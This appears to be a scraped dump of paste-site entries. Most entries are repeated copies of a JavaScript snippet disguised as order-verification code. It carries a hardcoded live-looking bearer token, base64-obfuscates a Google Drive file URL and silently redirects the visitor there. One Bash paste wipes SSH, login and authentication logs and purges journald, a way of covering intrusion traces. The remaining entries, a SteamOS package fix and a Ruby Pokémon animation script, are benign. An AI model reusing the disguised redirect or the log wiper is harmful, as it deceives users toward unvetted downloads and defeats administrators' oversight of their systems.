  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
uVwW9w0F,Untitled,navrajkhunger,JavaScript,Thursday 27th of March 2025 09:36:50 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/010/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
eVG0ijnH,clear,b3gund4L,Bash,Thursday 27th of March 2025 09:34:54 PM CDT,"#!/bin/bash

echo ""Menghapus log SSH dan login sebelum 3 bulan yang lalu...""

# Kosongkan log login jika file ada
[ -f /var/log/wtmp ] && > /var/log/wtmp
[ -f /var/log/btmp ] && > /var/log/btmp
[ -f /var/log/lastlog ] && > /var/log/lastlog
echo ""Log wtmp, btmp, dan lastlog telah dikosongkan.""

# Kosongkan log autentikasi SSH jika file ada
[ -f /var/log/auth.log ] && > /var/log/auth.log  # Debian/Ubuntu
[ -f /var/log/secure ] && > /var/log/secure      # CentOS/RHEL
echo ""Log autentikasi SSH telah dikosongkan.""

# Kosongkan log journalctl lebih dari 3 bulan
journalctl --vacuum-time=3months
echo ""Log journalctl telah dibersihkan.""

# Restart layanan logging untuk memastikan log baru berjalan dengan bersih
echo ""Restart layanan logging...""
service rsyslog restart

# Cek apakah auditd ada sebelum restart
if systemctl list-units --full --all | grep -q ""auditd.service""; then
    service auditd restart
fi

echo ""Layanan logging telah direstart.""

# Pembersihan tambahan untuk journalctl
journalctl --vacuum-time=1s
journalctl --unit=systemd-helper --rotate
journalctl --unit=systemd-helper --vacuum-time=1s
echo ""Pembersihan tambahan journalctl selesai.""
"
Tb2w86Ea,Products.js,navrajkhunger,JavaScript,Thursday 27th of March 2025 09:21:26 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/106/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
fZDrT7S0,Order.js,navrajkhunger,JavaScript,Thursday 27th of March 2025 09:05:55 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/017/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
3J0WFcbB,Market.js,navrajkhunger,JavaScript,Thursday 27th of March 2025 08:50:32 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/863/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
rS3GUuhZ,Untitled,lule34567,Bash,Thursday 27th of March 2025 08:38:32 PM CDT,"#!/bin/sh
 sudo rm -R /etc/pacman.d/gnupg
 sudo pacman-key --init
 sudo pacman-key --populate
 sudo steamos-readonly disable
 sudo pacman -Syy fluidsynth
 sudo steamos-readonly enable
"
Am83K9qy,Untitled,navrajkhunger,JavaScript,Thursday 27th of March 2025 08:35:09 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/047/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
55sT7vpj,SCRIPT MEGA EVOLUCION DE 21.1 A 19.1,ichigogeta,Ruby,Thursday 27th of March 2025 08:22:12 PM CDT,"# Mega Evolution
# Creation: bo4p5687
# Update: A.I.R

class SceneMegaEvolution
  def initialize
    @sprites={}
    @viewport = Viewport.new(0,0,Graphics.width,Graphics.height)
    @viewport.z = 99999
    @red = {}; @green = {}; @blue = {}
  end
 
  def start(time,backdrop,pkmn)

      @previousBGM = $game_system.getPlayingBGM
      pbSEPlay(""PRSFX- Mega Evolution1"")
      @pkmn = pkmn
      # Scene
      case time
      when 1; time = ""eve""
      when 2; time = ""night""
      end
      backdropFilename = backdrop
      if time
        trialName = sprintf(""%s_%s"",backdropFilename,time)
        backdropFilename = trialName if pbResolveBitmap(sprintf(""Graphics/Battlebacks/""+trialName+""_bg""))
      end
      # Center
      @middlex = Settings::SCREEN_WIDTH/2; @middley = Settings::SCREEN_HEIGHT/2
      # Background
      create_sprite(""bg"",""#{backdropFilename}_bg"",@viewport,""Battlebacks"")   
      set_zoom(""bg"",1,1.35)
      # Base
      create_sprite(""base"",""Base"",@viewport)
      @sprites[""base""].opacity = 0
      # Save color
      red = @sprites[""bg""].color.red; green = @sprites[""bg""].color.green
      blue = @sprites[""bg""].color.blue
      saveColor(""bg"",red,green,blue)
      # Set white screen (bitmap)
      @sprites[""bg""].color.red = 255; @sprites[""bg""].color.green = 255
      @sprites[""bg""].color.blue = 255
      17.times { @sprites[""bg""].color.alpha += 15; pbWait(3) }
      pbWait(3)
      # Restore color (background)
      restoreColor(""bg"",red,green,blue)
      17.times { @sprites[""bg""].color.alpha -= 15; pbWait(3) }
      pbWait(3)
      # Pokemon
      @sprites[""pkmn""] = Sprite.new(@viewport)
      @sprites[""pkmn""].bitmap = Bitmap.new(self.bitmapPkmn)
      ox = @sprites[""pkmn""].bitmap.width/2
      oy = @sprites[""pkmn""].bitmap.height/2
      set_oxoy_sprite(""pkmn"",ox,oy)
      set_xy_sprite(""pkmn"",@middlex,@middley)
      GameData::Species.play_cry(@pkmn)

#===============================CODIGO QUE INTENTO ANIMAR AL POKEMON==================================
      # Verificar si se obtuvo un AnimatedBitmap válido
      if self.animationPokemon
        # Obtener la duración de cada frame de la animación
        #frame_duration = self.animationPokemon.totalFrames / self.animationPokemon.total_frames
        frame_duration = 2/self.animationPokemon.totalFrames
        # Iterar a través de los frames de la animación
        self.animationPokemon.totalFrames.times do |frame_index|
          # Obtener el frame actual y asignarlo al bitmap del sprite del Pokémon
          current_frame = self.animationPokemon.copy
          current_frame[frame_index]
          #current_frame.set_frame(frame_index)
          @sprites[""pkmn""].bitmap = current_frame.bitmap

          # Esperar para mostrar cada frame con la duración correspondiente
          pbWait(frame_duration)
        end
      end

#==============================HASTA AQUI EL CODIGO DONDE INTENTO ANIMAR AL POKEMON========================
      # Buble (effect)
      setPositionEffectBuble
      # Set red screen (bitmap)
      @sprites[""bg""].color.red = 235; @sprites[""bg""].color.green = 0
      @sprites[""bg""].color.blue = 0
      17.times { @sprites[""bg""].color.alpha += 12; @sprites[""base""].opacity += 15
      @sprites[""pkmn""].color.alpha += 15; pbWait(3) }
      pbWait(3)
      # Set circle
      create_sprite(""circle"",""Circle"",@viewport)
      ox = @sprites[""circle""].bitmap.width/2
      oy = @sprites[""circle""].bitmap.height/2
      set_oxoy_sprite(""circle"",ox,oy)
      set_xy_sprite(""circle"",@middlex,@middley)
      set_zoom(""circle"",0,0)
      # Set buble
      setEffectBuble(0,0); setEffectBuble(4,1); setEffectBuble(8,2); setEffectBuble(12,3)
      setEffectBuble(1,0); setEffectBuble(5,1); setEffectBuble(9,2); setEffectBuble(13,3)
      setEffectBuble(2,0); setEffectBuble(6,1); setEffectBuble(10,2); setEffectBuble(14,3)
      setEffectBuble(3,0); setEffectBuble(7,1); setEffectBuble(11,2); setEffectBuble(15,3)
      # Animation
      zoom = 0; 15.times { zoom += 0.2; set_zoom(""circle"",zoom,zoom); pbWait(3) }
      # Save color (pokemon)
      redpkmn = @sprites[""pkmn""].color.red
      greenpkmn = @sprites[""pkmn""].color.green
      bluepkmn = @sprites[""pkmn""].color.blue
      saveColor(""pkmn"",redpkmn,greenpkmn,bluepkmn)
      # Set white (pokemon)
      @sprites[""pkmn""].color.red = 255; @sprites[""pkmn""].color.green = 255
      @sprites[""pkmn""].color.blue = 255; @sprites[""pkmn""].color.alpha = 255
      set_visible_sprite(""circle""); pbWait(3)
      # Light
      create_sprite(""light"",""Light"",@viewport)
      srcw = @sprites[""light""].bitmap.width/3
      srch = @sprites[""light""].bitmap.height
      set_src_wh_sprite(""light"",srcw,srch)
      set_src_xy_sprite(""light"",0,0)
      set_visible_sprite(""light"")
      # Circle 2
      create_sprite(""circle 2"",""Circle 2"",@viewport)
      srcw = @sprites[""circle 2""].bitmap.width/3
      srch = @sprites[""circle 2""].bitmap.height
      set_src_wh_sprite(""circle 2"",srcw,srch)
      set_src_xy_sprite(""circle 2"",0,0)
      set_oxoy_sprite(""circle 2"",srcw/2,srch/2)
      set_xy_sprite(""circle 2"",@middlex,@middley)
      # Save color (circle)
      redc = @sprites[""circle 2""].color.red
      greenc = @sprites[""circle 2""].color.green
      bluec = @sprites[""circle 2""].color.blue
      saveColor(""circle 2"",redc,greenc,bluec)
      # Set white (circle)
      @sprites[""circle 2""].color.red = 255; @sprites[""circle 2""].color.green = 255
      @sprites[""circle 2""].color.blue = 255; @sprites[""circle 2""].color.alpha = 255
      pbWait(3)
      # Animation
      zoom = 1; mul = 0; inc = 0
      9.times { mul+=1; zoom += 0.1; set_zoom(""circle 2"",zoom,zoom)
      if mul>=7
        # Restore color (circle)
        restoreColor(""circle 2"",redc,greenc,bluec)
        @sprites[""circle 2""].color.alpha = 0
        srcx = @sprites[""circle 2""].bitmap.width/3*inc
        set_src_xy_sprite(""circle 2"",srcx,0)
        set_visible_sprite(""light"",true)
        srcx = @sprites[""light""].bitmap.width/3*inc
        set_src_xy_sprite(""light"",srcx,0)
        inc += 1
      end
      pbSEPlay(""PRSFX- Mega Evolution2"")
      pbWait(3) }
      create_sprite(""scene"",""#{backdropFilename}_bg"",@viewport,""Battlebacks"")
      set_zoom(""scene"",1,1.35)
      @sprites[""scene""].color.red = 255; @sprites[""scene""].color.green = 255
      @sprites[""scene""].color.blue = 255; @sprites[""scene""].color.alpha = 255
      # Restore color
      # Pokemon
      restoreColor(""pkmn"",redpkmn,greenpkmn,bluepkmn)
      @sprites[""pkmn""].color.alpha = 0
      set_zoom(""pkmn"",2,2)
      # Background
      restoreColor(""bg"",red,green,blue)
      @sprites[""bg""].color.alpha = 0
      pbWait(3)
      set_visible_sprite(""circle 2""); set_visible_sprite(""light"")
      set_visible_sprite(""base"")
  end
 
  def megaEvolve
    # Reset Form
    @sprites[""pkmn""].bitmap = Bitmap.new(self.bitmapPkmn)
    17.times { @sprites[""scene""].opacity -= 15; pbWait(3) }
    zoom = 2
    10.times { zoom-=0.1; set_zoom(""pkmn"",zoom,zoom); pbWait(3) }
    create_sprite(""light 2"",""Light 2"",@viewport)
    ox = @sprites[""light 2""].bitmap.width/2
    oy = @sprites[""light 2""].bitmap.height/2
    set_oxoy_sprite(""light 2"",ox,oy)
    set_xy_sprite(""light 2"",@middlex,@middley-130)
    create_sprite(""icon"",""icon_mega"",@viewport,""Pictures/Battle"")
    ox = @sprites[""icon""].bitmap.width/2
    oy = @sprites[""icon""].bitmap.height/2
    set_oxoy_sprite(""icon"",ox,oy)
    set_xy_sprite(""icon"",@middlex,@middley-130)
    set_zoom(""icon"",1.5,1.5)
    o = 0
    10.times { 
			@sprites[""light 2""].angle += 36
			GameData::Species.play_cry(@pkmn) if o==5
			o += 1
			pbWait(20) 
		}
  end
 
  def setXYB(xname,yname,xcoor,ycoor)
    @xyb = {} if !@xyb; @xyb[xname] = xcoor; @xyb[yname] = ycoor
  end
#-------------------------------------------------------------------------------
# Effect
#-------------------------------------------------------------------------------
  # Buble
  def setPositionEffectBuble
    (0...16).each { |i|
    create_sprite(""buble #{i}"",""Buble Pink"",@viewport) if !@sprites[""buble #{i}""]
    case i
    when 0..3; xbb = @middlex/2-rand(10); ybb = @middley/2-rand(10)
    when 4..7; xbb = @middlex/2-rand(10); ybb = @middley*1.5+rand(10)
    when 8..11; xbb = @middlex*1.5+rand(10); ybb = @middley/2-rand(10)
    else; xbb = @middlex*1.5+rand(10); ybb = @middley*1.5+rand(10)
    end
    setXYB(""x #{i}"",""y #{i}"",xbb,ybb)
    set_xy_sprite(""buble #{i}"",xbb,ybb)
    set_visible_sprite(""buble #{i}"") }
  end
 
  def setEffectBuble(number,calc)
    set_visible_sprite(""buble #{number}"",true)
    5.times { xch = @xyb[""x #{number}""]; ych = @xyb[""y #{number}""]
    xxx = ((@middlex-xch)/5).floor; yyy = ((@middley-ych)/5).floor
    xxx2 = ((xch-@middlex)/5).floor; yyy2 = ((ych-@middley)/5).floor
    case calc
    when 0
      @sprites[""buble #{number}""].x += xxx; @sprites[""buble #{number}""].y += yyy
    when 1
      @sprites[""buble #{number}""].x += xxx; @sprites[""buble #{number}""].y -= yyy2
    when 2
      @sprites[""buble #{number}""].x -= xxx2; @sprites[""buble #{number}""].y += yyy
    else
      @sprites[""buble #{number}""].x -= xxx2; @sprites[""buble #{number}""].y -= yyy2
    end
    pbWait(3)}
    set_visible_sprite(""buble #{number}"")
    pbWait(3)
  end
#-------------------------------------------------------------------------------
# Bitmap, Color
#-------------------------------------------------------------------------------
#GameData::Species.front_sprite_filename( (@pkmn.species), (@pkmn.form rescue 0), (@pkmn.gender), (@pkmn.shiny?), (@pkmn.shadowPokemon?) )
  def bitmapPkmn
		file = GameData::Species.front_sprite_filename( (@pkmn.species), (@pkmn.form rescue 0), (@pkmn.gender), (@pkmn.shiny?), (@pkmn.shadowPokemon?) )
    return file 
  end

#=====================METODO PARA DONDE UTILIZO UN METODO DE GameData::Species============================================
  def animationPokemon
    animated_bitmap = GameData::Species.front_sprite_bitmap((@pkmn.species), (@pkmn.form rescue 0), (@pkmn.gender), (@pkmn.shiny?), (@pkmn.shadowPokemon?))
    return animated_bitmap
  end

#=====================HASTA AQUI EL METODO PARA DONDE UTILIZO UN METODO DE GameData::Species==============================
  def saveColor(sprite,red,green,blue)
    @red[sprite] = red; @green[sprite] = green; @blue[sprite] = blue
  end
 
  def restoreColor(sprite,red,green,blue)
    red = @red[sprite]; green = @green[sprite]; blue = @blue[sprite]
  end
  

#-------------------------------------------------------------------------------
# Set
#-------------------------------------------------------------------------------
  # Image
  def create_sprite(spritename,filename,vp,dir=""Pictures/Mega Evo Scene"")
    @sprites[""#{spritename}""] = Sprite.new(vp)
    @sprites[""#{spritename}""].bitmap = Bitmap.new(""Graphics/#{dir}/#{filename}"")
  end
 
  # Set ox, oy
  def set_oxoy_sprite(spritename,ox,oy)
    @sprites[""#{spritename}""].ox = ox
    @sprites[""#{spritename}""].oy = oy
  end
 
  # Set x, y
  def set_xy_sprite(spritename,x,y)
    @sprites[""#{spritename}""].x = x
    @sprites[""#{spritename}""].y = y
  end
 
  # Set zoom
  def set_zoom(spritename,zoom_x,zoom_y)
    @sprites[""#{spritename}""].zoom_x = zoom_x
    @sprites[""#{spritename}""].zoom_y = zoom_y
  end
 
  # Set visible
  def set_visible_sprite(spritename,vsb=false)
    @sprites[""#{spritename}""].visible = vsb
  end
 
  # Set src
  def set_src_wh_sprite(spritename,w,h)
    @sprites[""#{spritename}""].src_rect.width = w
    @sprites[""#{spritename}""].src_rect.height = h
  end
 
  def set_src_xy_sprite(spritename,x,y)
    @sprites[""#{spritename}""].src_rect.x = x
    @sprites[""#{spritename}""].src_rect.y = y
  end
#-------------------------------------------------------------------------------
#-------------------------------------------------------------------------------
  def endScene
    # Reset bitmap
    megaEvolve
    # End
    pbDisposeSpriteHash(@sprites)
  end
end


class PokeBattle_Battle
  # Mega
def pbMegaEvolve(idxBattler)
    battler = @battlers[idxBattler]
    return if !battler || !battler.pokemon
    return if !battler.hasMega? || battler.mega?
    #$stats.mega_evolution_count += 1 if battler.pbOwnedByPlayer?
    trainerName = pbGetOwnerName(idxBattler)
    old_ability = battler.ability_id
    # Break Illusion
    if battler.hasActiveAbility?(:ILLUSION)
      Battle::AbilityEffects.triggerOnBeingHit(battler.ability, nil, battler, nil, self)
    end
    # Mega Evolve
    case battler.pokemon.megaMessage
    when 1   # Rayquaza
      pbDisplay(_INTL(""{1}'s fervent wish has reached {2}!"", trainerName, battler.pbThis))
    else
      pbDisplay(_INTL(""{1}'s {2} is reacting to {3}'s {4}!"",
                      battler.pbThis, battler.itemName, trainerName, pbGetMegaRingName(idxBattler)))
    end
    		# Animation
		megascene = SceneMegaEvolution.new
		megascene.start(time,backdrop,battler.pokemon)
    #pbCommonAnimation(""MegaEvolution"", battler)
    battler.pokemon.makeMega
    battler.form = battler.pokemon.form
    battler.pbUpdate(true)
    @scene.pbChangePokemon(battler, battler.pokemon)
    @scene.pbRefreshOne(idxBattler)
    #pbCommonAnimation(""MegaEvolution2"", battler)
    		# End animation
		megascene.endScene
    megaName = battler.pokemon.megaName
    megaName = _INTL(""Mega {1}"", battler.pokemon.speciesName) if nil_or_empty?(megaName)
    pbDisplay(_INTL(""{1} has Mega Evolved into {2}!"", battler.pbThis, megaName))
    side  = battler.idxOwnSide
    owner = pbGetOwnerIndexFromBattlerIndex(idxBattler)
    @megaEvolution[side][owner] = -2
    if battler.isSpecies?(:GENGAR) && battler.mega?
      battler.effects[PBEffects::Telekinesis] = 0
    end
    # Trigger ability
    #battler.pbOnLosingAbility(old_ability)
    #battler.pbTriggerAbilityOnGainingIt
    # Recalculate turn order
    pbCalculatePriority(false, [idxBattler]) if Settings::RECALCULATE_TURN_ORDER_AFTER_MEGA_EVOLUTION
    
    battler.pbEffectsOnSwitchIn
  end
end"
DQr40YUq,Products.js,navrajkhunger,JavaScript,Thursday 27th of March 2025 08:19:38 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/000/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
WuQ4LxvL,Order.js,navrajkhunger,JavaScript,Thursday 27th of March 2025 08:04:16 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/071/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
A3LrdYjB,Market.js,navrajkhunger,JavaScript,Thursday 27th of March 2025 07:48:32 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/338/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
